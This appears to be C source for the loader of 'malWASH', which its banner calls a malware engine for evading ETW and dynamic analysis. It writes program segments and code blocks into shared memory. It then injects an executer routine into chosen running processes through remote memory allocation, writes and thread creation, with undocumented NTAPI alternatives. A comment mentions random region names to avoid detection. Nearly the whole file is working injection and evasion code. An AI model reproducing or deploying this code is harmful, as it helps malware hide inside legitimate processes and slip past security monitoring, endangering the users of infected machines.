
//-----------------------------------------------------------------------------------------------------------
// function definitions
//-----------------------------------------------------------------------------------------------------------
/*
**  fatal(): This function is called when fatal error are occured. fatal() prints the error description and
**      terminates the program.
**
**  Arguments: format (char*) : A format string, containing the error description
**
**  Return Value: None.
*/
void fatal( const char* format, ... )
{
    va_list args;                                           // our arguments

    fprintf( stderr, " [ERROR]: " );                        // print error identifier

    va_start( args, format );                               // start using variable argument list
    vfprintf( stderr, format, args );                       // print error message
    va_end( args );                                         // stop using variable argument list

    fprintf( stderr, ". Quiting!\n" );                      // print trailer

    system("pause");                                        // hold on to read the message

    exit( EXIT_FAILURE );                                   // terminate with failure
}

//-----------------------------------------------------------------------------------------------------------
/*
**  crtshreg(): Create a new shared region
**
**  Arguments: regnam (char*) : Name of shared region (can be a random name) 
**             size   (uint)  : Size of requested shared region
**              
**  Return Value: A unsigned char pointer to the shared region. If any errors occured, fatal is called.
*/
// ----------------------------------------------------------------------------------------------------------
LPBYTE crtshreg( char regnam[], uint size, void* baseaddr=NULL )
{   
    //wchar_t fullregnam[(MAXSEGNAMELEN<<1) + 16] = {0};        // store UNICODE name here
    char fullregnam[MAXSEGNAMELEN + 16] = {0};              // store UNICODE name here
    HANDLE  hMapFile = 0;                                   // memory map file handle
    LPBYTE  shptr = 0;                                      // a pointer to shared region


    // convert char* to wchar_t* (assume no errors)
    // If regname has length MAXSEGNAMELEN, we have to reserve MAXSEGNAMELEN*2 space for fullregnam
    //swprintf_s(fullregnam,(MAXSEGNAMELEN<<1) + 16, L"Global\\%hs", regnam);
    sprintf_s(fullregnam,MAXSEGNAMELEN + 16, "Global\\%hs", regnam);

    // create a file-mapping kernel object which used to refer the file buffer of a given file
    if( (hMapFile = CreateFileMappingA(
                    INVALID_HANDLE_VALUE,                   // use paging file
                    NULL,                                   // default security
                    PAGE_READWRITE,                         // read/write access
                    0,                                      // maximum object size (high-order DWORD)
                    size,                                   // maximum object size (low-order DWORD)
                    fullregnam                              // name of mapping object
               )) == NULL )                                 // error occured ?
        fatal("Can't create file mapping object '%s' (errno %d).", regnam, GetLastError());

    // map a buffer referred to by file mapping object to the local process space of the current process
    if( (shptr = (LPBYTE) MapViewOfFileEx(
                    hMapFile,                               // handle to map object
                    FILE_MAP_ALL_ACCESS,                    // read/write permission
                    0,                                      // high-order 32 bits of file offset
                    0,                                      // low-order 32 bits of file offset
                    size,                                   // number of bytes to map
                    baseaddr                                // base address (NULL if we don't care)
                )) == NULL ) {                              // does an error occured ?
        CloseHandle(hMapFile);                              // close memory mapped file
        fatal("Can't map view of file '%s' (errno %d).", regnam, GetLastError());      
    }

    return shptr;                                           // return pointeer to shared region
}

// ----------------------------------------------------------------------------------------------------------
/*
**  loadsegms(): Load segment table in shared control region, and then load its corresponding segments to 
**      separate shared regions.
**
**  Arguments: None.
**
**  Return Value: None. If an error occurred fatal() is called.
*/
// ----------------------------------------------------------------------------------------------------------
void loadsegms( void )
{
    BYTE    *segm;                                          // pointer to segment in shared region
    uint    i = 0;                                          // iterator


    for(byte *p=supsegm[0]; p;  p=supsegm[++i])             // for each segment in NULL terminating suptab 
    {
        shctrl->segm[i].segmid = i;                         // set index
        shctrl->segm[i].startEA = *(uint*)p;                // first 4 bytes is start RVA
        shctrl->segm[i].endEA   = *(uint*)(p + 4);          // next  4 bytes is end RVA
        
        // the name can be random to avoid detection. However we choose such names to make debugging easier.
        sprintf_s(shctrl->segm[i].name, 6, "seg%02d", shctrl->segm[i].segmid);

        segm = crtshreg(shctrl->segm[i].name, seglen[i]-8); // allocate a shared region for this segment

        segbase[i] = segm;                                  // store base address (we need it for initab relocations)

        memcpy(segm, (void*)(p+8), seglen[i]-8);            // copy const array to shared region
    }
}

// ----------------------------------------------------------------------------------------------------------
/*
**  loadfuntab(): Load function table in the shared control region.
**
**  Arguments: None.
**
**  Return Value: None.
*/
// ----------------------------------------------------------------------------------------------------------
void loadfuntab( void )
{
    memcpy(&shctrl->funtab, funtab, funtablen);             // just copy from const array to shared region
}

// ----------------------------------------------------------------------------------------------------------
/*
**  loadmodtab(): Load module table in the shared control region. Work similar with segment table.
**
**  Arguments: None.
**
**  Return Value: None. If an error occurred fatal() is called.
*/
// ----------------------------------------------------------------------------------------------------------
void loadmodtab( void )
{
    uint    i, j, k;                                        // we need 3 iterators
    
    for( i=0, k=0; i<modtablen; i++ )                       // for each character in modtab (i++ is for skipping newline)
    {       
        i += 2;                                             // first 2 bytes is module id. Skip them

        for( j=0; modtab[i]!='\n'; j++ )                    // stop copying when you reach a newline
            shctrl->modl[k].name[j] = modtab[i++];          // copy dll name

        k++;                                                // get next entry in modl table
    }
}

// ----------------------------------------------------------------------------------------------------------
/*
**  loadthdtab(): Load thread table in the shared control region. Work similar with segment table.
**
**  Arguments: None.
**
**  Return Value: None. If an error occurred fatal() is called.
*/
// ----------------------------------------------------------------------------------------------------------
void loadthdtab( void )
{
    // read up to NMAXTHREADS-1 threads 
    for(uint i=1, j=0; i<NMAXTHREADS && thdtab[j]; i++, j+=2 ) {    // slot #0 is reserved for main thread
        shctrl->thrdrtn[i] = thdtab[j];
        shctrl->nxtblk [i] = thdtab[j+1];
    }
}

// ----------------------------------------------------------------------------------------------------------
/*
**  loadinitab(): Load initialized pointer table in shared control region
**
**  Arguments: None.
**
**  Return Value: None. If ant occurred fatal() is called.
*/
void loadinitab( void )
{
    for(uint i=0; i<initablen; i+=3 )                       // for each entry in initab
        // relocate pointer
        *(uint*)((uint)segbase[ initab[3*i] ] + initab[3*i+2]) = 
        *(uint*)((uint)segbase[ initab[3*i] ] + initab[3*i+2]) - shctrl->segm[initab[3*i+1]].startEA +
                (SEGMBASEADDR + initab[3*i+1]*SEGMNXTOFF);
}

// ----------------------------------------------------------------------------------------------------------
/*
**  loadblks(): Load program's blocks
**
**  Arguments: None.
**
**  Return Value: None. If an error occurred fatal() is called.
*/
// ----------------------------------------------------------------------------------------------------------
void loadblks( void )
{
    char    blknam[16] = {0};                               // block ID name
    BYTE    *blkptr;                                        // block pointer to shared region
    uint    blksz;                                          // block size
    

    for( uint i=0; i<shctrl->nblks; i++ )                   // store each block in a separate region
    {
        printf( "[+] Loading block #%d... ", i+1 );
        
        sprintf_s(blknam, 16, "%d", i+1 );                  // convert ID to string

        blksz  = blklen[i];                                 // get block size
        blkptr = crtshreg(blknam, blksz);                   // create shared region

        memcpy(blkptr, supblk[i], blksz );

        if( *(ushort*)(blkptr + 4) < MAXNBLKS )             // overflow?
            strcpy_s(shctrl->blk[*(ushort*)(blkptr+4) ].name, 8, blknam);
        else fatal("Overflow detected in block #%d", i);

        printf( "Done.\n" );
    }
}

//-----------------------------------------------------------------------------------------------------------
/*
**  inject(): Inject the whole executer() into an open, with the appropriate permissions to create a remote
**      thread, process. If injection is successfull function also closes the open handle to that process.
**      executer() needs process IDs of all other instances, to perform certain operations in duptab and in
**      mailbox. Thus we create all threads in suspended state, we set up tables, and then we launch all 
**      threads together.
**  
**  Arguments: hproc (HANDLE) : An open handle to a process.
**      
**  Return Value: If function is successful, function returns a handle to the suspended remote thread. 
**      Otherwise, the return value is NULL.
*/
HANDLE inject( HANDLE hproc )
{
    LPVOID  funst, funent;                                  // executer() entry point in current and remote process
    ULONG   funsz;                                          // executer() size
    LPBYTE  p;                                              // auxilary pointer
    DWORD   nwritten, threadid;                             // written bytes and thread ID
    HANDLE  hrthreadhdl;                                    // remote thread handle

    //
    // executer() must allocate some memory regions in predefined addresses (for stack, heap and segments). 
    // We have to make sure that these allocations won't fail. So, we try to do some dummy allocation to
    // see if they fail. If not, we deallocate the memory. If the allocation doesn't fail, we know that 
    // the allocationsin executer won't fail.
    //
/*  
    LPVOID vp, vp2;                                         // void auxilary pointers 

    // try to allocate memory for stack and heap (4M for heap seem enough)
    vp  = VirtualAllocEx(hproc, a, STACKSIZE, MEM_COMMIT, PAGE_READWRITE);
    vp2 = VirtualAllocEx(hproc, (void*)HEAPBASEADDR,  0x400000,  MEM_COMMIT, PAGE_READWRITE);
    if( !vp || !vp2 ||                                      // allocation or free failed?
        !VirtualFreeEx(hproc, vp, STACKSIZE, MEM_DECOMMIT) ||
        !VirtualFreeEx(hproc, vp2, 0x400000, MEM_DECOMMIT) )
            return NULL;                                    // if so, return NULL


    for( uint i=0; i<shctrl->nsegms; i++ )                  // for each segment
    {
        // try to allocate memory for segment
        vp = VirtualAllocEx(hproc, (LPVOID)(SEGMBASEADDR + i*SEGMNXTOFF), SEGMNXTOFF, 
                            MEM_COMMIT, PAGE_READWRITE);

        if( !vp ||                                                  // allocation failed?
            !VirtualFreeEx(hproc, vp, SEGMNXTOFF, MEM_DECOMMIT) )   // free failed?
                return NULL;                                        // if so, return NULL
    }
*/

    // Now, we identify the base address of executer() and its size:
    //
    // when we ask the address of executer, we actually get its address in Import Local Table (ILT):
    // executer:
    //      00311203 E9 08 03 00 00       jmp         executer (311510h)
    //
    // from there we can get the offset from the current location, and find the real address:
    //      [1]. (ULONG)executer + 1, to skip the 0xe9 opcode and go to the address of the offset
    //      [2]. *(LPDWORD)((ULONG)executer + 1), to read the offset
    //      [3]. (ULONG)executer + *(LPDWORD)((ULONG)executer + 1) + 5 will gives us the real entry point
    //           (+5=jmp length, because jump offset starts from the instruction below)
    //
    //  after finding the entry point, we have to find the end point. 9 bytes before function end we have
    //  added a unique signature: "malWASH_ends$$$". We start from the beginning and we search downwards 
    // for this signature. Once we find this signature, we know that 9 bytes (for function epilog) below 
    // is the function end.
    funst = executer;
    funsz = sizeof(executer);

    // allocate memory to remote process
#ifndef __VAR_5_USE_NTAPI_FOR_INJECTION__
    if( (funent = VirtualAllocEx(hproc, NULL, funsz, MEM_COMMIT, PAGE_EXECUTE_READWRITE)) == NULL )
#else
    funent = NULL;                                          // clear base address

    if( ZwAllocateVirtualMemory(hproc, &funent, 0, &funsz, MEM_COMMIT, PAGE_EXECUTE_READWRITE ) 
        != STATUS_SUCCESS ) 
#endif
    #ifdef __ABORT_ON_INJECT_FAILURE__                      // abort upon failures?
            fatal("Cannot allocate memory to remote process: %d", GetLastError() );
    #else
            return false;                                   // just return false
    #endif
   
    // copy executer to remote process address space
    // do not have breakpointss in executer() during copy -> they'll replace opcodes with 0xcc (int3)
#ifndef __VAR_5_USE_NTAPI_FOR_INJECTION__
    if( !WriteProcessMemory(hproc, funent, funst, funsz, &nwritten) )
#else
    if( ZwWriteVirtualMemory(hproc, funent, funst, funsz, &nwritten) != STATUS_SUCCESS )
#endif
    #ifdef __ABORT_ON_INJECT_FAILURE__                      // abort upon failures?     
            fatal("Cannot write to remote process");
    #else
            return false;                                   // just return false
    #endif
    
    // create the remote thread in suspended state
#ifndef __VAR_5_USE_NTAPI_FOR_INJECTION__
    if( !(hrthreadhdl = CreateRemoteThread(hproc, NULL, 0, (LPTHREAD_START_ROUTINE)funent, 
                            NULL, CREATE_SUSPENDED, &threadid)))
#else
// WARNING: Both RtlCreateUserThread and NtCreateThreadEx fail under win64
//
// You can also try this
//  if( RtlCreateUserThread(hproc, NULL, TRUE, 0, NULL, NULL, funent, NULL, &hrthreadhdl, NULL) 
//      != STATUS_SUCCESS ) 

    ULONG a = 0, b = 0;
    NtCreateThreadExBuffer Buffer;
    memset(&Buffer, 0, sizeof(NtCreateThreadExBuffer));
 
    Buffer.Size     = sizeof(NtCreateThreadExBuffer);
    Buffer.Unknown1 = 0x10003;
    Buffer.Unknown2 = 0x8;
    Buffer.Unknown3 = &a;
    Buffer.Unknown4 = 0;
    Buffer.Unknown5 = 0x10004;
    Buffer.Unknown6 = 4;
    Buffer.Unknown7 = &b;
    Buffer.Unknown8 = 0;
 
    if( NtCreateThreadEx( &hrthreadhdl, 0x1FFFFF, NULL, hproc, (LPTHREAD_START_ROUTINE)funent,
                            NULL, FALSE, NULL, NULL, NULL, &Buffer) != STATUS_SUCCESS )
#endif
    #ifdef __ABORT_ON_INJECT_FAILURE__                      // abort upon failures?     
            fatal("Cannot create remote thread");
    #else
            return false;                                   // just return false
    #endif

    // close process handle (don't do error check)
    CloseHandle( hproc );   

    return hrthreadhdl;                                     // success!
}

//-----------------------------------------------------------------------------------------------------------
/*
**  findprocs(): Inject code in some processes. This function can take a whitelist of process names and try
**      to inject only on these processes, or a blacklist and inject the code in any process except these
**      in list. In the latter case, we specify the number of processes that we want to inject executer().
**
**  Arguments: N       (ushort)   : The number of processes to inject
**            proclist (wchar_t*) : A list of process names
**            lm       (listmode) : Type of list (whitelist - blacklist)
**
**  Return Value: If function is successful, function retunrs the open handle
*/
void findNprocs( ushort N, const wchar_t *proclist[], listmode lm )
{
    HANDLE          snapshot, hproc;                        // snapshot and current process handles
    PROCESSENTRY32W proc32;                                 // process entry
    ushort          ninj = 0;                               // number of injected processes so far
    int             skip;                                   // internal flag


    // try to take a snapshot of all active processes
    if((snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE)
        fatal("Cannot take  a snapshot of running processes");
    
    proc32.dwSize = sizeof(PROCESSENTRY32W);                // set up process size

    while( Process32NextW(snapshot,&proc32) == TRUE )       // as long as there are processes in the list
    {
        skip = !lm;                                         // =1 if ALLOW, =0 if EXCLUDE
        
        for( uint i=0; proclist[i]!=NULL; i++ )             // for each process name in process list
            if( !wcscmp(proc32.szExeFile, proclist[i] ) )   // check if name matcehs
            {
                skip = lm;                                  // =0 if ALLOW, =1 if EXCLUDE
                break;                                      // stop searching
            }

        if( skip ) continue;                                // is skip set? if so get next process

        // try to open process
#ifndef __VAR_5_USE_NTAPI_FOR_INJECTION__   
        if((hproc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
                                    FALSE, proc32.th32ProcessID )) != NULL)
#else 
    OBJECT_ATTRIBUTES objAttribs = { 0 };
    CLIENT_ID cid = { (HANDLE) proc32.th32ProcessID, 0 };

    InitializeObjectAttributes(&objAttribs, NULL, OBJ_CASE_INSENSITIVE, NULL, NULL);

    if( ZwOpenProcess(&hproc, PROCESS_CREATE_THREAD| PROCESS_VM_OPERATION | PROCESS_VM_WRITE, 
            &objAttribs, &cid) == STATUS_SUCCESS )
#endif  
        {
            shctrl->pidtab[ninj] =  proc32.th32ProcessID;   // store process id (if inject fails, next 
                                                            // attempt will overwrite it)
            if( (threadid[ninj] = inject(hproc)) &&         // increase only if inject() was successfull
                ++ninj >= N ) break;                        // inject to N processes?
        }
    }
}

//-----------------------------------------------------------------------------------------------------------
/*
**  That's the main function...
*/
//-----------------------------------------------------------------------------------------------------------
int main(int argc, char* argv[])
{
    printf("++==============================================================++\n");
    printf("||                       _   __      __                _        ||\n");
    printf("||     _ __    __ _     | |  \\ \\    / /__ _     ___   | |_      ||\n");
    printf("||    | '  \\  / _` |    | |   \\ \\/\\/ // _` |   (_-<   | ' \\     ||\n");
    printf("||    |_|_|_| \\__,_|   _|_|_   \\_/\\_/ \\__,_|   /__/_  |_||_|    ||\n");
    printf("||   _|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|   ||\n");
    printf("||   \"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'   ||\n");
    printf("++==============================================================++\n");
    printf("||                           malWASH                            ||\n");
    printf("||   The malware engine for evading ETW and dynamic analysis    ||\n");
    printf("||                                                              ||\n");
    printf("||                    Block Execution Engine                    ||\n");
    printf("++==============================================================++\n");


    reasm();                                                // reassemble large arrays
    
#ifdef __VAR_5_USE_NTAPI_FOR_INJECTION__

    HMODULE ntdll = GetModuleHandle(L"ntdll.dll");          // get ntdll.dll module

    // locate undocumented functions (with no error check)
    ZwOpenProcess           = (_ZwOpenProcess)          GetProcAddress(ntdll, "ZwOpenProcess");
    ZwAllocateVirtualMemory = (_ZwAllocateVirtualMemory)GetProcAddress(ntdll, "ZwAllocateVirtualMemory");
    ZwWriteVirtualMemory    = (_ZwWriteVirtualMemory)   GetProcAddress(ntdll, "ZwWriteVirtualMemory");
    NtCreateThreadEx        = (_NtCreateThreadEx)       GetProcAddress(ntdll, "NtCreateThreadEx");
    RtlCreateUserThread     = (_RtlCreateUserThread)    GetProcAddress(ntdll, "RtlCreateUserThread");

#endif

    // create or attach to shared control region
    shctrl = (shctrl_t*) crtshreg("ControlRegion", sizeof(shctrl_t), NULL );
    
    if( strcmp(shctrl->signature, "malWASH") )              // valid signature ?
    {
        // signature isn't valid. So this process is the first one tha uses the shared region. Initialize it.
        strcpy_s(shctrl->signature, 8, "malWASH");
         
        shctrl->nblks       = NBLOCKS;                      // set number of blocks
        shctrl->nxtblk[0]   = 1;                            // always start with block 1
        shctrl->nsegms      = NSEGMS;                       // set number of segments
        shctrl->nproc       = NPROC;                        // set number of processses
        shctrl->nxtheapaddr = HEAPBASEADDR;                 // that's  the base address of shared heap

        for( int i=0; i<NMAXTHREADS; i++ )                  // for each possible thread
        {   
            // set at the middle of current stack
            shctrl->ctx[i].esp = STACKBASEADDR + (STACKSIZE + 0x20000)*i + 0x10000;
            shctrl->ctx[i].ebp = shctrl->ctx[i].esp - 0x80; // OPTIONAL
            shctrl->ctx[i].eax = 0xdeadbeef;                // that's totally useless

            shctrl->thrdst[i] = THREAD_UNUSED;              // all threads are disabled
        }

        shctrl->thrdst[0] = THREAD_RUNNING;                 // main thread is active

        /*
        ** Set up Default command line arguments:
        **
        **  int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd);
        **  int main   (int argc, char *argv);
        */
        loadsegms();                                        // load segments to shared memory
        loadmodtab();                                       // load module table to shared memory
        loadfuntab();                                       // load function table to shared memory
        loadthdtab();                                       // load thread table to shared memory
        loadinitab();                                       // load initialized pointer table to shared memory
        loadblks();                                         // load all blocks to shared memeory
        
        printf( "[+] All blocks loaded successfully\n" );
    
        // if you want to set argc and argv main arguments (or WinMain() arguments), here's the right
        // place to do it:
        //  [1]. Create the shared stack
        //  [2]. Start Placing the arguments starting from shctrl->ctx.esp + 4:
        //  [3]. Set a possible exit point as return address
        crtshreg("SharedStack1", STACKSIZE, (void*)STACKBASEADDR );
        *(uint*)(shctrl->ctx[0].esp) = (uint)(ExitThread);  // return address to ExitThread

        setargs( shctrl );                              // setup command line arguments
    }
    
    // search in function table for calls to WSAStartup(). If you find it, every process must call
    // it. It doesn't matter when you'll call this function. Instead of sending a mail to other processes
    // at the time that the first process calls WSAStartup(), we send the mail now, to make things easier.
    // Note that we ignore calls to WSACleanup().
    for( uint i=0; i<FUNTBLSIZE; i++ )                      // scan funtab non-efficiently (it contains NULLs)
        if( !strcmp(&shctrl->funtab[i], "WSAStartup") )     // function found?
        {       
            for( uint i=0; i<shctrl->nproc; i++ )           // for each process
                shctrl->mailbox[i][0].cmd = CMD_WSASTARTUP; // send the proper mail to each process
        }

    // find some processes to inject executer()
    printf( "[+] Searching for at most %d process(es) to inject executer()... ", NPROC );
    
    findNprocs( NPROC, whitelist, ALLOW);
    // findNprocs( 4, blacklist, EXCLUDE);

    printf( "Done.\n" );
    printf( "[+] Launching executer() of all processes...\n" );

    // resume all threads (ResumeThread(NULL) won't cause problems)
    for( uint i=0; i<shctrl->nproc; i++ )                   // for each process
        printf( "Starting Emulator at process %d. Return Value: %d\n", 
                shctrl->pidtab[i],  
                ResumeThread( threadid[i] ) );              // start remote thread execution
                                                            // (no problem if it's NULL)
                
    printf( "Done.\n" );
    
    // this delay is needed to make sure that the first emulator will start
    // before loader close, because we need >0 processes to be attached in shared regions
    printf( "Adding a small 'safe' delay...\n" );
    Sleep(1000);                                            
    
    printf( "Exiting. Bye bye!\n\n");
    
    return 0;                                               // return success!
}
//-----------------------------------------------------------------------------------------------------------
